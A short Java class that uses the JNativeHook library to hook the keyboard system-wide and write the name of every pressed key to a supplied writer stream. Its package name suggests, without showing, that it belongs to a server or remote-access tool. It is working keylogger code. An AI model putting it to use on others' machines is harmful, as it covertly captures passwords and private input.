package Server;

import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.keyboard.NativeKeyEvent;

import java.io.BufferedWriter;

public class Listener implements NativeKeyListener {
    private BufferedWriter bw;
    
    public Listener(BufferedWriter bw) {
        this.bw = bw;
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        // TODO Auto-generated method stub
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase();
        try {
            bw.write(keyText);
            bw.newLine();
            bw.flush();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // TODO Auto-generated method stub
        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // TODO Auto-generated method stub
        
    }   
}
